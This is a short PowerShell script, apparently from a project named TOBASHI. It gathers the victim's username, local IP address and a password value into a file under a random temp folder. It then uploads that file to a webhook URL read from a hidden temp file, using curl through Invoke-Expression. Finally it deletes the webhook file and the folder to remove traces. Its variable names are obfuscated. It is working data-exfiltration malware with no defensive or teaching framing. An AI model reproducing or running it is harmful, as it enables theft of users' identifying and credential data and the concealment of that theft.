Function Get-RandomAlphanumericString {
	-join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
}


$password = "Hdde"
$fr = Get-RandomAlphanumericString
$temp = "$env:TEMP/$fr"
mkdir  $temp
$test_directory = "C:\Users\greg4\OneDrive\Documents\TOBASHI\tests"

Set-Location $temp

$dVbsxUYbndsd = "$env:UserName.txt"
$OjgfhgUyyg = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
New-Item -path "." -Name $dVbsxUYbndsd -Force

Add-Content -path "./$dVbsxUYbndsd" -Value $env:UserName -Force #username
Add-Content -path "./$dVbsxUYbndsd" -Value $OjgfhgUyyg -Force #ip
Add-Content -path "./$dVbsxUYbndsd" -Value $password -Force #pass




$filePath = "C:\Users\$env:UserName\AppData\Local\Temp\fruHgdbsM.txt"

$webhookUrl = Get-Content -Path $filePath

Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"tobashiconsole\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$dVbsxUYbndsd```" $webhookUrl"


# escape

Set-Location ..
Remove-Item -Path ".\fruHgdbsM.txt" -Force
Remove-Item -Path ".\$fr" -Recurse -Force










